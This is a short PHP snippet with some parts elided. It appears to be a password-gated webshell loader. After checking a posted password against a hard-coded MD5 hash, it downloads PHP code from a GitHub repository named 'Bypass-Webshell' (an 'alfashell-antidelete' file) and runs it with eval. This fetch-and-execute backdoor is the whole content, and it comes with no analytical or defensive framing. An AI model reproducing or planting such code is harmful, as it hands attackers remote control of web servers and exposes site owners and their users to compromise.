...
if (isset($_POST['password'])) {
    ...
    $hashed_password = 'c82959fbc9455322df07ac1893e8b3ef'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/refs/heads/main/alfashell-antidelete.php');
    eval('?>' . $a);
} else {
